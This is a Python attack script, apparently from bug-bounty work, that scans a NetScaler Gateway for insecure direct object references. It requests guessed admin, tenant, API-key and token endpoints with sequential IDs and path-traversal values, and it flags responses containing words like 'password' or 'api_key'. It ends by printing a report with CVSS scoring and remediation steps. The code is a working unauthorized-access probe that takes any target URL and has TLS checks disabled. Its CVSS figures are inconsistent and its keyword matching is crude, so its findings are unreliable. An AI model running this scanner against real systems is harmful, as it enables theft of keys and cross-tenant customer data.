#!/usr/bin/env python3
"""
IDOR Scanner - Insecure Direct Object Reference
CVSS 4.0: 8.5 (HIGH)
Target: NetScaler Gateway

Description:
Tests for IDOR vulnerabilities that can lead to:
- Key compromise
- Customer data leakage
- Cross-tenant unauthorized access
"""

import requests
import sys
from urllib.parse import urljoin
import concurrent.futures

class IDORScanner:
    def __init__(self, target, session_cookie=None):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        
        if session_cookie:
            self.session.cookies.set('NSC_COOKIE', session_cookie)
        
        # Common IDOR patterns to test
        self.idor_patterns = [
            # User/Session IDs
            ('/admin/user?id={id}', [1, 2, 3, 99, 100]),
            ('/api/users/{id}', [1, 2, 3]),
            ('/api/v1/sessions/{id}', [1, 2]),
            ('/api/profile?id={id}', [1, 2, 3]),
            
            # Tenant/Organization IDs
            ('/api/tenants/{id}', [1, 2, 100]),
            ('/tenant/admin?id={id}', [1, 2]),
            ('/org/settings?id={id}', [1]),
            
            # Key/Token IDs
            ('/api/keys/{id}', [1, 2, 3]),
            ('/api/tokens/{id}', [1, 2]),
            ('/admin/apikeys?id={id}', [1]),
            
            # Configuration IDs
            ('/admin/config?id={id}', [1, 2, 3]),
            ('/cgi/delete?id={id}', [1, 2]),
            ('/vpn/tunnel?id={id}', [1]),
            
            # File/Document IDs
            ('/admin/logs?file={id}', ['..', '../etc', '../var']),
            ('/admin/download?id={id}', [1, 2]),
        ]
    
    def test_idor_endpoint(self, endpoint_template, id_values):
        """Test a specific endpoint pattern for IDOR"""
        results = []
        
        for id_val in id_values:
            endpoint = endpoint_template.replace('{id}', str(id_val))
            url = f"{self.target}{endpoint}"
            
            try:
                r = self.session.get(url, timeout=10)
                
                # Check for successful unauthorized access
                if r.status_code == 200:
                    # Analyze response for sensitive data
                    sensitive_patterns = [
                        'password', 'secret', 'key', 'token', 'credential',
                        'email', 'phone', 'address', 'ssn', 'credit',
                        'account', 'customer', 'tenant', 'api_key', 'private'
                    ]
                    
                    for pattern in sensitive_patterns:
                        if pattern.lower() in r.text.lower():
                            results.append({
                                'endpoint': endpoint,
                                'id_value': id_val,
                                'status': 200,
                                'sensitive_data': pattern,
                                'vulnerable': True
                            })
                            break
                    else:
                        # Found but no obvious sensitive data
                        results.append({
                            'endpoint': endpoint,
                            'id_value': id_val,
                            'status': 200,
                            'sensitive_data': None,
                            'vulnerable': False
                        })
                        
                # Check for access denied (proper auth)
                elif r.status_code in [401, 403]:
                    results.append({
                        'endpoint': endpoint,
                        'id_value': id_val,
                        'status': r.status_code,
                        'sensitive_data': None,
                        'vulnerable': False
                    })
                    
            except Exception as e:
                continue
                
        return results
    
    def scan_all(self, max_workers=5):
        """Scan all IDOR patterns"""
        print("\n[*] Starting IDOR scan...")
        
        all_results = []
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = []
            
            for endpoint, ids in self.idor_patterns:
                future = executor.submit(self.test_idor_endpoint, endpoint, ids)
                futures.append((endpoint, future))
            
            for endpoint, future in futures:
                try:
                    results = future.result(timeout=30)
                    all_results.extend(results)
                except Exception as e:
                    print(f"[-] Error scanning {endpoint}: {e}")
        
        return all_results
    
    def generate_report(self, findings):
        """Generate IDOR vulnerability report"""
        vulnerable = [f for f in findings if f.get('vulnerable')]
        
        report = f"""
================================================================================
                    IDOR VULNERABILITY REPORT
================================================================================

Vulnerability: Insecure Direct Object Reference (IDOR)
Severity: {"CRITICAL" if vulnerable else "NOT FOUND"}
CVSS 4.0 Score: 8.5 (HIGH)
Impact: Key compromise / Customer data leakage

Target: {self.target}

--------------------------------------------------------------------------------
SUMMARY
--------------------------------------------------------------------------------
Total endpoints tested: {len(self.idor_patterns)}
Total requests: {len(findings)}
Vulnerable endpoints: {len(vulnerable)}

--------------------------------------------------------------------------------
VULNERABLE ENDPOINTS
--------------------------------------------------------------------------------
"""
        
        for v in vulnerable:
            report += f"""
  Endpoint: {v['endpoint']}
    ID Value: {v['id_value']}
    HTTP Status: {v['status']}
    Sensitive Data Type: {v['sensitive_data']}
    Impact: Direct access to unauthorized {v['sensitive_data']} data
"""
        
        report += f"""
--------------------------------------------------------------------------------
CVSS 4.0 METRICS
--------------------------------------------------------------------------------
Attack Vector: Network (AV:N)
Attack Complexity: Low (AC:L)
Privileges Required: None (PR:N)
User Interaction: None (UI:N)
Confidentiality: High (VC:H)
Integrity: High (VI:H)
Availability: High (VA:H)

CVSS Vector: CVSS:4.0/AV:N/AC:L/PR:N/UI:N/VC:H/VI:H/VA:H/SC:L/SI:L/SA:L
CVSS Score: 8.5 (HIGH) / 10.0 (CRITICAL with high impact)

--------------------------------------------------------------------------------
REMEDIATION
--------------------------------------------------------------------------------
1. Implement proper authorization checks on all endpoints
2. Use indirect references (mapping IDs to actual resources)
3. Validate user has permission to access requested resource
4. Implement audit logging for all resource access
5. Apply principle of least privilege

================================================================================
"""
        return report

def main():
    print("""
╔═══════════════════════════════════════════════════════════════════════════╗
║                                                                           ║
║  ██████╗ ███████╗██████╗ ███████╗██╗     ██╗ ██████╗████████╗           ║
║  ██╔══██╗██╔════╝██╔══██╗██╔════╝██║     ██║██╔════╝╚══██╔══╝           ║
║  ██║  ██║█████╗  ██████╔╝█████╗  ██║     ██║██║        ██║              ║
║  ██║  ██║██╔══╝  ██╔══██╗██╔══╝  ██║     ██║██║        ██║              ║
║  ██████╔╝███████╗██║  ██║███████╗███████╗██║╚██████╗   ██║              ║
║  ╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝ ╚═════╝   ╚═╝              ║
║                                                                           ║
║  IDOR Scanner - Insecure Direct Object Reference                          ║
║  NetScaler Gateway                                                       ║
║                                                                           ║
╚═══════════════════════════════════════════════════════════════════════════╝
""")
    
    if len(sys.argv) < 2:
        print(f"\nUsage: python3 {sys.argv[0]} <TARGET_URL> [SESSION_COOKIE]")
        print(f"\nExample: python3 {sys.argv[0]} https://vpn.target.com NSC_COOKIE_VALUE")
        sys.exit(1)
    
    target = sys.argv[1]
    session_cookie = sys.argv[2] if len(sys.argv) > 2 else None
    
    scanner = IDORScanner(target, session_cookie)
    findings = scanner.scan_all()
    
    report = scanner.generate_report(findings)
    print(report)
    
    # Save report
    report_file = '/root/netscaler-bounty/idor-poc/IDOR_REPORT.txt'
    with open(report_file, 'w') as f:
        f.write(report)
    print(f"[+] Report saved to: {report_file}")

if __name__ == "__main__":
    main()